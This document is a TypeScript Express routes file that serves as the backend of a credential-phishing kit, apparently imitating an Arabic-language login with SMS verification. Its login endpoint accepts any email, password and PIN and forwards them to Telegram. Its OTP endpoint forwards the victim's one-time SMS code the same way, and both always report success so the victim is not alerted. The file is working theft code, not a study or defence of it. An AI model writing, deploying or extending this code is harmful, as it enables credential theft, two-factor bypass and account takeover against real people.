import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { loginSchema, verifyOtpSchema } from "@shared/schema";
import { sendToTelegram, formatLoginMessage, formatSMSMessage } from "./telegram";

// Store temporary data (email and SMS codes) for users
const tempUserData = new Map<string, { email: string; password: string; pin: string }>();

function generateUserId(): string {
  return `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Login endpoint - accepts ANY credentials
  app.post("/api/auth/login", async (req, res) => {
    try {
      const validatedData = loginSchema.parse(req.body);
      const { email, password, pin } = validatedData;

      // Generate unique user ID
      const userId = generateUserId();

      // Store user data temporarily
      tempUserData.set(userId, { email, password, pin });

      // Send login data to Telegram
      const telegramMessage = formatLoginMessage(email, password, pin);
      await sendToTelegram(telegramMessage);

      console.log(`✅ Login data sent to Telegram for: ${email}`);

      // Always return success
      res.json({ 
        success: true, 
        userId: userId,
        message: "تم إرسال رمز التحقق إلى هاتفك" 
      });
    } catch (error: any) {
      console.error("Login error:", error);
      res.status(400).json({ message: error.message || "خطأ في البيانات المدخلة" });
    }
  });

  // Verify OTP endpoint - accepts ANY SMS code
  app.post("/api/auth/verify-otp", async (req, res) => {
    try {
      const validatedData = verifyOtpSchema.parse(req.body);
      const { userId, otp } = validatedData;

      // Get user data
      const userData = tempUserData.get(userId);
      
      if (!userData) {
        return res.status(401).json({ message: "الجلسة منتهية، يرجى تسجيل الدخول مجدداً" });
      }

      // Send SMS code to Telegram
      const telegramMessage = formatSMSMessage(userData.email, otp);
      await sendToTelegram(telegramMessage);

      console.log(`✅ SMS code sent to Telegram for: ${userData.email} - Code: ${otp}`);

      // Clean up temporary data
      tempUserData.delete(userId);

      // Always return success
      res.json({ 
        success: true,
        message: "تم التحقق بنجاح" 
      });
    } catch (error: any) {
      console.error("OTP verification error:", error);
      res.status(400).json({ message: error.message || "خطأ في التحقق" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
